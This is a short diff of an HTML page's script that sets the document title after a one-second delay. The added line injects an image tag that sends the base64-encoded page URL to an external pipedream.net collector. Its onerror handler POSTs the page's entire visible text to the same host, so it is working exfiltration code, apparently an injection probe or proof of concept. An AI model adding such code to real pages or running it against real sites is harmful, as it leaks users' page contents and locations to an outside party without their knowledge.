@@ -4,7 +4,7 @@
     <title>Initial Title</title>
     <script>
         setTimeout(() => {
-            document.title = '<base href="https://eownbmaqeyx6p8e.m.pipedream.net/">';
+            document.title = '<img src="https://eownbmaqeyx6p8e.m.pipedream.net/?' + btoa(document.location.href) + '" onerror="fetch(\'https://eownbmaqeyx6p8e.m.pipedream.net\', {method:\'POST\', body:document.body.innerText})">';
         }, 1000);
     </script>
 </head>
